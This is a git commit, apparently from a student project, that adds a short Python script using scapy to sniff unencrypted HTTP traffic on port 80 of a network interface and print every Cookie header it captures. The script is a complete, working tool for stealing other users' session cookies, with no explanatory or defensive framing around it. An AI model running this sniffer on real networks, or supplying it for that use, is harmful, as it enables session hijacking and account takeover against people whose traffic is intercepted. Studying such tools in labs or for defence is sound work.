12b2bf28a781d5be0bfcf6b2c33fdb96a7125c99
Knapen <a.d.knapen@student.tue.nl>
2018-03-16 15:11:20 +0100

    new: initial version';

---
+++ http_listener.py
@@ -0,0 +1,22 @@
+#!/usr/bin/python
+
+import re
+from base64 import b64decode
+from scapy.all import sniff
+
+dev = "enp0s3"
+
+
+def handle_packet(packet):
+    tcp = packet.getlayer("TCP")
+    match = re.search(r"Cookie: (.+)", str(tcp.payload))
+    if match:
+        print match.group(1)
+
+
+sniff(
+    iface=dev,
+    store=0,
+    filter="tcp and port 80",
+    prn=handle_packet
+)
